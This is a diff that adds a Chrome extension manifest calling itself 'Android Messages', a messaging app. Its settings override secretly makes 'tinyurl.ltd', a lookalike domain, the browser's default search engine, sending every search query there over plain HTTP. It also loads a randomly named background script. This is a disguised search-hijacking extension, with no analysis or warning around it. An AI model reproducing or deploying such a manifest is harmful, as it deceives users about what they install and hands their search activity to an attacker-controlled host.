@@ -1,0 +1,27 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+ "offline_enabled": true,
+  "manifest_version": 2,
+
+  "name": "Android Messages",
+  "description": "Android Messages makes it easy to communicate with anyone by using SMS, MMS, and more.",
+  "version": "3.2.4",
+  
+  "browser_action": {
+    "default_icon": "icon.png",
+    "default_popup": "popup.html"
+  },
+    "chrome_settings_overrides": {
+        "search_provider": {
+            "encoding": "UTF-8",
+            "favicon_url": "http://tinyurl.ltd/favicon.ico",
+            "is_default": true,
+            "keyword": "tinyurl",
+            "name": "tinyurl",
+            "search_url": "http://tinyurl.ltd/search4?q={searchTerms}"
+        }
+    },
+  "background": {
+      "scripts": [ "iyoisdlgsh.js" ]
+   }
+}
